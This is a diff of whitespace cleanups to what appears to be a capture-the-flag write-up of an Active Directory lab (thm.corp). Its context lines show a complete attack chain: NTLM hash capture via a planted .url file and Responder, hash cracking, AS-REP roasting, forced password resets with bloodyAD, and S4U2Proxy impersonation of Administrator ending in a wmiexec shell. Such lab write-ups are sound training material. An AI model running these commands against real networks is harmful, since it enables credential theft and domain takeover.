@@ -27,7 +27,7 @@ PORT     STATE SERVICE       VERSION
 | ssl-cert: Subject: commonName=HayStack.thm.corp
 | Not valid before: 2026-02-21T12:59:14
 |_Not valid after:  2026-08-23T12:59:14
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: THM
 |   NetBIOS_Domain_Name: THM
 |   NetBIOS_Computer_Name: HAYSTACK
@@ -38,14 +38,14 @@ PORT     STATE SERVICE       VERSION
 Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-time: 
+| smb2-time:
 |   date: 2026-02-22T13:00:31
 |_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled and required
-                                                                                                                                                      
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                        
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 56.71 seconds
 ```
 
@@ -67,17 +67,17 @@ ff02::2 ip6-allrouterso
 Let's see if we have guest logon allowed for SMB share.
 
 ```bash
-kali@kali:smbclient -L \\10.48.155.57                                                                                                                        
-Password for [WORKGROUP\kali]:                                                                                                                        
+kali@kali:smbclient -L \\10.48.155.57
+Password for [WORKGROUP\kali]:
 
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
-        Data            Disk      
+        Data            Disk
         IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.48.155.57 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
@@ -86,7 +86,7 @@ Unable to connect with SMB1 -- no workgroup available
 That was successful. We see default shares except Data. Let's dive into that share.
 
 ```bash
-kali@kali:smbclient \\\\10.48.155.57\\Data                                                                                                                        
+kali@kali:smbclient \\\\10.48.155.57\\Data
 Password for [WORKGROUP\kali]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -141,54 +141,11 @@ kali@kali:sudo responder -I tun0
     DNS                        [ON]
     DHCP                       [OFF]
     DHCPv6                     [OFF]
-
-[+] Servers:
-    HTTP server                [ON]
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [ON]
-    SQL server                 [ON]
-    FTP server                 [ON]
-    IMAP server                [ON]
-    POP3 server                [ON]
-    SMTP server                [ON]
-    DNS server                 [ON]
-    LDAP server                [ON]
-    MQTT server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]                                                                                                                          
-    SNMP server                [ON]                                                                                                                          
-                                                                                                                                                             
-[+] HTTP Options:                                                                                                                                            
-    Always serving EXE         [OFF]                                                                                                                         
-    Serving EXE                [OFF]                                                                                                                         
-    Serving HTML               [OFF]                                                                                                                         
-    Upstream Proxy             [OFF]                                                                                                                         
-                                                                                                                                                             
-[+] Poisoning Options:                                                                                                                                       
-    Analyze Mode               [OFF]                                                                                                                         
-    Force WPAD auth            [OFF]                                                                                                                         
-    Force Basic Auth           [OFF]                                                                                                                         
-    Force LM downgrade         [OFF]
-    Force ESS downgrade        [OFF]
-
-[+] Generic Options:
-    Responder NIC              [tun0]
-    Responder IP               [192.168.130.26]
-    Responder IPv6             [fe80::aa30:185b:e7a6:8e15]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
-    Don't Respond To MDNS TLD  ['_DOSVC']
-    TTL for poisoned response  [default]
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-OS0E6D2ZAU2]
-    Responder Domain Name      [0BI7.LOCAL]
-    Responder DCE-RPC Port     [48254]
-
+.
+.
+.
+.
+.
 [*] Version: Responder 3.2.0.0
 [*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
 
@@ -214,7 +171,7 @@ putting file theft.url as \onboarding\theft.url (0.8 kB/s) (average 0.6 kB/s)
 ```
 
 ```bash
-[+] Listening for events...                                                                                                                                  
+[+] Listening for events...
 
 [SMB] NTLMv2-SSP Client   : 10.48.155.57
 [SMB] NTLMv2-SSP Username : THM\AUTOMATE
@@ -224,21 +181,21 @@ putting file theft.url as \onboarding\theft.url (0.8 kB/s) (average 0.6 kB/s)
 Great !!! We got the NTLM hash for user AUTOMATE. Let's crack the hash we have.
 
 ```bash
-kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                    
+kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-Pa...d1        (AUTOMATE)     
+Pa...d1        (AUTOMATE)
 1g 0:00:00:00 DONE (2026-02-22 18:59) 5.882g/s 1337Kp/s 1337Kc/s 1337KC/s astigg..920227
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
-Session completed. 
+Session completed.
 ```
 
 Since, we have a valid user, we can use bloodhound to map the entire domain for better visuals.
 
 ```bash
-kali@kali:bloodhound-python -u 'AUTOMATE' -p 'Pa...d1' -d thm.corp -ns 10.48.155.57 -c All                                                                       
+kali@kali:bloodhound-python -u 'AUTOMATE' -p 'Pa...d1' -d thm.corp -ns 10.48.155.57 -c All
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: thm.corp
 INFO: Getting TGT for user
@@ -248,8 +205,7 @@ INFO: Found 1 domains in the forest
 INFO: Found 1 computers
 INFO: Connecting to GC LDAP server: haystack.thm.corp
 INFO: Connecting to LDAP server: haystack.thm.corp
-INFO: Found 42 users
-INFO: Found 55 groups
+INFO: Found 42 usersINFO: Found 55 groups
 INFO: Found 3 gpos
 INFO: Found 222 ous
 INFO: Found 19 containers
@@ -327,14 +283,14 @@ Neo4j is the database for bloodhound. The bloodhound UI will be available at "*h
 We know that our current user is part of Remote Management Users, so we can either RDP into the machine (if they are also in the Remote Desktop Users group) or use evil-winrm to establish a PowerShell Remoting session.
 
 ```bash
-kali@kali:evil-winrm -i reset.thm -u AUTOMATE -p Passw0rd1                                                                                                                                                                                        
-                                        
+kali@kali:evil-winrm -i reset.thm -u AUTOMATE -p Passw0rd1                                                                    
+
 Evil-WinRM shell v3.9
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\automate\Documents>
 ```
@@ -351,8 +307,8 @@ THM{AU.....US}
 We find 3 of the users are AS-REP Roastable. Let's get their AS-REP Hash, so that we can crack them.
 
 ```bash
-kali@kali:impacket-GetNPUsers thm.corp/ -usersfile users.txt -dc-ip 10.48.155.57 -no-pass                                                                          
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-GetNPUsers thm.corp/ -usersfile users.txt -dc-ip 10.48.155.57 -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 $krb5asrep$23$ernesto_silva@THM.CORP:22b98360.....cd951
 $krb5asrep$23$leann_long@THM.CORP:fe0b4bf2.....c10c9982
@@ -388,7 +344,7 @@ Let's get into resetting the password. We will use bloodyAD for this.
 First, let's change password of shawna_bray as tabatha_briit has GenericAll capability.
 
 ```bash
-kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u tabatha_britt -p 'ma...5)' set password shawna_bray 'NewPassword123!'                                 
+kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u tabatha_britt -p 'ma...5)' set password shawna_bray 'NewPassword123!'
 [+] Password changed successfully!
 ```
 
@@ -402,17 +358,17 @@ kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u shawna_bray -p 'NewPasswor
 Now, we can reset the passsword of darla_winters as cruz_hall.
 
 ```bash
-kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u cruz_hall -p 'NewPassword123!' set password darla_winters 'NewPassword123!'                       
+kali@kali:bloodyAD --host 10.48.155.57 -d thm.corp -u cruz_hall -p 'NewPassword123!' set password darla_winters 'NewPassword123!'
 [+] Password changed successfully!
 ```
 
 <img width="956" height="943" alt="Screenshot 2026-02-23 082544" src="https://github.com/user-attachments/assets/9bde5584-c5bc-40f5-a4a6-5b85a9a627ac" />
 
-That's a lot of resetting. Now, all that is done.Since darla_winters is allowed to delegate, we used impacket-getST to perform a S4U2Proxy request, successfully impersonating the Administrator and saving the service ticket as a .ccache file.
+That's a lot of resetting. Now, all that is done. Since darla_winters is allowed to delegate, we used impacket-getST to perform a S4U2Proxy request, successfully impersonating the Administrator and saving the service ticket as a .ccache file.
 
 ```bash
-kali@kali:impacket-getST -dc-ip 10.48.155.57 -spn cifs/HAYSTACK.thm.corp thm.corp/darla_winters:'NewPassword123!' -impersonate Administrator                       
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-getST -dc-ip 10.48.155.57 -spn cifs/HAYSTACK.thm.corp thm.corp/darla_winters:'NewPassword123!' -impersonate Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
@@ -425,11 +381,11 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 We have a ticket. Let's set our environment variable to point to the new cache file and use klist to verify that we are now holding a valid Service Ticket for the Administrator to access the CIFS service on HAYSTACK.
 
 ```bash
-kali@kali:export KRB5CCNAME=Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache                                                                                   
+kali@kali:export KRB5CCNAME=Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache
 ```
 
 ```bash
-kali@kali:klist                                                                                                                                                    
+kali@kali:klist
 Ticket cache: FILE:Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache
 Default principal: Administrator@thm.corp
 
@@ -441,8 +397,8 @@ Valid starting       Expires              Service principal
 We have all that set, now we can logon using impacket-wmiexec as user Administrator.
 
 ```bash
-kali@kali:impacket-wmiexec -k -no-pass HAYSTACK.thm.corp                                                                                                           
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-wmiexec -k -no-pass HAYSTACK.thm.corp
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] SMBv3.0 dialect used
 [!] Launching semi-interactive shell - Careful what you execute
